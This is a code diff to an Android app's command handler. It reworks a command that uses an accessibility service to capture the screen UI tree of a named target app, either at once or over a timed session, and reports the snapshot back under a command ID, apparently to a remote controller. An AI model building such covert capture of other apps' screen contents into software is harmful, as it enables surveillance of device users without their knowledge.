@@ -307,14 +307,8 @@ object CommandProcessor {
                     
                     val service = MyAccessibilityService.instance
                     if (service != null) {
-                        if (mins <= 0) {
-                            service.startTreeDump(null, 0)
-                            status = "SCAN_SESSION_TERMINATED"
-                        } else {
-                            // 1. Start background session
-                            service.startTreeDump(pkg, mins)
-                            
-                            // 2. Try Instant Capture
+                        if (mins <= 0L) {
+                            // Instant Frame Grab (No Session)
                             val instantTree = service.getInstantTree(pkg, depth)
                             if (!instantTree.has("error")) {
                                 status = "SCAN_COMPLETE"
@@ -323,15 +317,17 @@ object CommandProcessor {
                                     put("snapshot", instantTree)
                                 }
                                 updateCommandStatus(ctx, id, status, null, result, null)
-                                return
                             } else {
-                                // 3. Target app is NOT in foreground. Queue lazy capture.
-                                service.pendingTreeCommandId = id
-                                service.pendingTreeDepth = depth
-                                status = "WAITING_FOR_TARGET_APP"
-                                updateCommandStatus(ctx, id, status, null, null, null)
-                                return
+                                status = "FAILED (NOT_IN_FOREGROUND)"
+                                errorMsg = instantTree.optString("error")
                             }
+                            return
+                        } else {
+                            // Start Delayed Session
+                            service.startTreeDump(pkg, mins, id, depth)
+                            status = "SCAN_SESSION_ACTIVE (${mins}M)"
+                            updateCommandStatus(ctx, id, status, null, null, null)
+                            return
                         }
                     } else {
                         status = "FAILED (SERVICE_OFF)"
